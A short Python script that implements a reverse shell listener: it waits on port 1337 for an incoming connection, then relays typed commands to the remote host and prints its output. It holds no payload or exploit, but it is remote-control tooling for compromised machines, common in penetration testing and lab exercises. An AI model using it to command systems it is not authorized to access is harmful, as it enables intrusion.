#!/usr/bin/env python3
import socket
import sys
import threading
import time

def receive_data(client):
    """Thread to continuously receive data"""
    while True:
        try:
            data = client.recv(4096).decode('utf-8', errors='ignore')
            if not data:
                print("\n[-] Connection closed by remote host")
                break
            print(data, end='', flush=True)
        except Exception as e:
            print(f"\n[-] Error receiving data: {e}")
            break

def start_listener(port=1337):
    """Start a reverse shell listener"""
    
    # Create socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("0.0.0.0", port))
        server.listen(1)
        print(f"[+] Listening on port {port}...")
        print(f"[+] Waiting for connection...")
        
        # Accept connection
        client, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}")
        print("[+] You can now type commands. Type 'exit' to quit.\n")
        
        # Start receiver thread
        receiver = threading.Thread(target=receive_data, args=(client,), daemon=True)
        receiver.start()
        
        # Wait a moment for initial prompt
        time.sleep(1)
        
        # Send commands
        while True:
            try:
                command = input()
                
                if command.lower() == 'exit':
                    print("[+] Closing connection...")
                    break
                
                client.send((command + '\n').encode())
                
            except KeyboardInterrupt:
                print("\n[+] Interrupted by user")
                break
            except Exception as e:
                print(f"[-] Error sending command: {e}")
                break
                
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        try:
            client.close()
        except:
            pass
        server.close()
        print("[+] Listener closed")

if __name__ == "__main__":
    port = 1337
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    
    start_listener(port)